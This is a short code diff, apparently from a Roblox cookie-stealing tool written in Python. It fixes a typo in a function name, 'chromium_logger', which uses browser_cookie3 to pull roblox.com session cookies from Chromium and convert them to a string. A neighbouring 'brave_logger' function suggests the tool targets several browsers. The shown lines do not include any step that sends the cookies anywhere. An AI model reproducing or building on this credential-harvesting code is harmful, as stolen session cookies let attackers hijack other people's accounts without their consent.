@@ -38,7 +38,7 @@ def brave_logger():
     except:
         pass
     
-def chromium_logge(): # Not like anyone uses that anyways lol
+def chromium_logger(): # Not like anyone uses that anyways lol
     try:
         cookies = browser_cookie3.chromium(domain_name='roblox.com')
         cookies = str(cookies)
